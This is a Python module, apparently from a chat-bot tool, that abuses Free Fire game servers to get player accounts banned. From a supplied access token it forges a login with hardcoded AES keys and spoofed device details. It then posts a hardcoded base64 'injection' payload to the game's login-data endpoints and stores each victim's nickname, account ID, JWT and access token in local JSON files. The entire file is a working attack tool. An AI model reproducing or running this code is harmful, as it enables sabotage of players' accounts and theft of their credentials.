# ban_manager.py
import os
import sys

# Ensure project directory is on sys.path even when launched from another working directory.
_PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))
if _PROJECT_DIR not in sys.path:
    sys.path.insert(0, _PROJECT_DIR)

import json
import time
import base64
import requests
import urllib3
import urllib.parse
from datetime import datetime
import asyncio
from typing import Tuple, Dict, Any, Optional

urllib3.disable_warnings()

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("\n[!] 'pycryptodome' library missing. Please install: pip install pycryptodome")
    sys.exit(1)

# استيراد ملفات protobuf (موجودة بالفعل في المشروع)
PROTO_DIR = os.path.dirname(os.path.abspath(__file__))
if PROTO_DIR not in sys.path:
    sys.path.insert(0, PROTO_DIR)
try:
    import MajoRLogin_pb2 as mLpB
    import MajorLoginRes_pb2 as mLrPb
except ImportError as e:
    print(f"\n[!] Failed to import Protobuf modules: {e}")
    print(f"[!] Expected files in: {PROTO_DIR}")
    sys.exit(1)

# --- ثوابت من app.py ---
API_URLS = [
    'https://clientbp.ggpolarbear.com/GetLoginData',
    'https://client.ind.freefiremobile.com/GetLoginData',
    'https://client.us.freefiremobile.com/GetLoginData'
]

BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV  = b'6oyZDr22E3ychjM%'
mLuRl  = "https://loginbp.ggpolarbear.com/MajorLogin"

mLhDr = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-GA": "v1 1",
    "X-Unity-Version": "2018.4.11f1",
    "ReleaseVersion": "OB54"
}

# --- دوال مساعدة (مأخوذة من app.py مع تعديلات طفيفة) ---

def decode_ff_name(b64_str: str) -> str:
    try:
        if not b64_str:
            return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            decrypted_bytes.append(byte ^ key_byte)
        name = decrypted_bytes.decode('utf-8', errors='ignore')
        return name if name else "Unknown"
    except Exception:
        return "Unknown"

def enc(d):
    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))

def dec(d):
    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

def build_majorlogin(tok: str, open_id: str, p_type: int) -> bytes:
    m = mLpB.MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = "1.129.1"
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = "2019118695"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc(m.SerializeToString())

def get_openid_from_token(tok: str) -> Optional[str]:
    try:
        r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}",
                         headers={"User-Agent": "Mozilla/5.0"}, timeout=5, verify=False)
        data = r.json()
        return data.get("open_id")
    except:
        pass
    # محاولة بديلة
    try:
        uid_headers = {"access-token": tok, "user-agent": "Mozilla/5.0"}
        uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/",
                               headers=uid_headers, timeout=5, verify=False).json()
        uid = uid_res.get("uid")
        if uid:
            openid_res = requests.post("https://topup.pk/api/auth/player_id_login",
                                       headers={"Content-Type": "application/json"},
                                       json={"app_id": 100067, "login_id": str(uid)},
                                       timeout=5, verify=False).json()
            return openid_res.get("open_id")
    except:
        pass
    return None

def fetch_majorlogin_jwt(tok: str) -> Tuple[Optional[str], Optional[str], Optional[str]]:
    """
    ترجع (jwt_token, original_token, error_msg)
    """
    if tok.startswith("ey") and "." in tok:
        return tok, tok, None

    oId = get_openid_from_token(tok)
    if not oId:
        return None, None, "Failed to extract Open ID. Token invalid or expired."

    platforms = [8, 3, 4, 6]
    for p_type in platforms:
        pl = build_majorlogin(tok, oId, p_type)
        try:
            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=10, verify=False)
            if x.status_code == 200:
                res = mLrPb.MajorLoginRes()
                try:
                    res.ParseFromString(dec(x.content))
                except:
                    res.ParseFromString(x.content)
                if res.token:
                    return res.token, tok, None
        except:
            continue
    return None, None, "MajorLogin failed. Account might be blocked or platform mismatch."

def decode_jwt(token: str) -> Dict:
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        decoded_str = decoded_bytes.decode('utf-8')
        return json.loads(decoded_str)
    except Exception:
        return {}

def get_region_api_url(jwt_token: str, access_token: Optional[str] = None) -> Tuple[str, str]:
    try:
        payload = decode_jwt(jwt_token)
        region = payload.get('lock_region', payload.get('region', '')).upper()
        if region:
            if 'IND' in region:
                return 'https://client.ind.freefiremobile.com/GetLoginData', region
            elif 'US' in region or 'NA' in region:
                return 'https://client.us.freefiremobile.com/GetLoginData', region
            else:
                return 'https://clientbp.ggpolarbear.com/GetLoginData', region
        if access_token:
            oId = get_openid_from_token(access_token)
            if oId:
                try:
                    resp = requests.get(f"https://ff.garena.com/api/antiban/player_info/?open_id={oId}&lang=en",
                                        headers={"User-Agent": "Mozilla/5.0"}, timeout=5, verify=False)
                    if resp.status_code == 200:
                        region = resp.json().get('data', {}).get('region', '').upper()
                        if region:
                            if 'IND' in region:
                                return 'https://client.ind.freefiremobile.com/GetLoginData', region
                            elif 'US' in region or 'NA' in region:
                                return 'https://client.us.freefiremobile.com/GetLoginData', region
                            else:
                                return 'https://clientbp.ggpolarbear.com/GetLoginData', region
                except:
                    pass
        for url in API_URLS:
            try:
                response = requests.head(url, timeout=3, verify=False)
                if 'ind' in url.lower():
                    return url, 'IND'
                elif 'us' in url.lower():
                    return url, 'US'
            except:
                continue
        return API_URLS[0], 'Unknown'
    except:
        return API_URLS[0], 'Unknown'

def trigger_injection(jwt_token: str, version: str):
    region_url, _ = get_region_api_url(jwt_token)
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    try:
        response = requests.post(region_url, headers=headers, data=body, timeout=20, verify=False)
        if response.status_code == 200:
            return response, region_url
        # جرب باقي الروابط
        for url in API_URLS:
            if url == region_url:
                continue
            r = requests.post(url, headers=headers, data=body, timeout=20, verify=False)
            if r.status_code == 200:
                return r, url
        return response, region_url
    except Exception as e:
        raise Exception(f"All API URLs failed: {e}")

def get_ban_status(region: str) -> Dict:
    if 'IND' in region.upper():
        return {'status': 'PERMANENT BAN', 'duration': 'Permanent', 'icon': '🔴'}
    else:
        return {'status': 'TEMPORARY BAN', 'duration': '7 Days', 'icon': '⚠️'}

def get_region_name(region: str) -> str:
    region = region.upper()
    mapping = {
        'BD': 'BD', 'IND': 'IND', 'VN': 'VN', 'TH': 'TH', 'ID': 'ID',
        'TW': 'TW', 'SG': 'SG', 'PK': 'PK', 'RU': 'RU', 'EU': 'EU',
        'ME': 'ME', 'BR': 'BR', 'US': 'US', 'SAC': 'SAC', 'NA': 'NA'
    }
    for key in mapping:
        if key in region:
            return mapping[key]
    return 'Unknown'

def save_banned_account(region: str, nickname: str, account_id: str, jwt_token: str,
                        ban_info: Dict, used_api_url: str, access_token: str) -> Tuple[bool, str]:
    try:
        region_name = get_region_name(region)
        filename = f"banned-{region_name}.json"
        data = {"region": region, "accounts": []}
        if os.path.exists(filename):
            with open(filename, 'r', encoding='utf-8') as f:
                try:
                    data = json.load(f)
                except:
                    data = {"region": region, "accounts": []}
        actual_access_token = access_token if access_token and access_token != "N/A" else jwt_token
        account_data = {
            "nickname": nickname,
            "account_id": account_id,
            "jwt_token": jwt_token,
            "access_token": actual_access_token,
            "ban_type": ban_info['status'],
            "ban_duration": ban_info['duration'],
            "server_url": used_api_url,
            "region": region,
            "banned_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "timestamp": int(time.time())
        }
        if "accounts" not in data:
            data["accounts"] = []
        existing = False
        for acc in data["accounts"]:
            if acc.get("account_id") == account_id:
                acc.update(account_data)
                existing = True
                break
        if not existing:
            data["accounts"].append(account_data)
        data["region"] = region
        data["last_updated"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data["total_banned"] = len(data["accounts"])
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        return True, filename
    except Exception as e:
        return False, str(e)

# --- الدالة الرئيسية للحظر (غير متزامنة، تُستدعى في thread) ---

def perform_ban_sync(access_token: str) -> Dict[str, Any]:
    """
    تنفيذ عملية الحظر وإرجاع قاموس بالنتيجة.
    """
    try:
        # 1. المصادقة
        result = fetch_majorlogin_jwt(access_token)
        if isinstance(result, tuple) and len(result) == 3:
            jwt_token, original_token, error_msg = result
        else:
            return {"success": False, "error": "Unexpected authentication result format"}

        if error_msg or not jwt_token:
            return {"success": False, "error": error_msg or "Authentication failed"}

        actual_access_token = original_token if original_token else access_token

        # 2. فك JWT
        user_data = decode_jwt(jwt_token)
        raw_nick = user_data.get('nickname', '')
        nickname = decode_ff_name(raw_nick)
        account_id = str(user_data.get('account_id', 'Unknown'))
        version = user_data.get('release_version', 'Latest')

        region_from_jwt = user_data.get('lock_region', user_data.get('region', '')).upper()
        used_url, detected_region = get_region_api_url(jwt_token, actual_access_token)
        if region_from_jwt:
            region = get_region_name(region_from_jwt)
        else:
            region = get_region_name(detected_region)

        ban_info = get_ban_status(region)

        # 3. حقن الطلب
        ban_resp, used_api_url = trigger_injection(jwt_token, version)

        if ban_resp.status_code == 200:
            # حفظ البيانات
            save_result, filename = save_banned_account(
                region, nickname, account_id, jwt_token, ban_info, used_api_url, actual_access_token
            )
            return {
                "success": True,
                "nickname": nickname,
                "account_id": account_id,
                "region": region,
                "version": version,
                "server_url": used_api_url,
                "ban_type": ban_info['status'],
                "ban_duration": ban_info['duration'],
                "saved_file": filename if save_result else None,
                "save_status": save_result
            }
        else:
            return {
                "success": False,
                "error": f"Payload injection failed with status {ban_resp.status_code}",
                "status_code": ban_resp.status_code,
                "nickname": nickname,
                "account_id": account_id
            }

    except Exception as e:
        return {"success": False, "error": f"Unexpected error: {str(e)}"}

# دالة غير متزامنة للاستدعاء من البوت
async def perform_ban(access_token: str) -> Dict[str, Any]:
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, perform_ban_sync, access_token)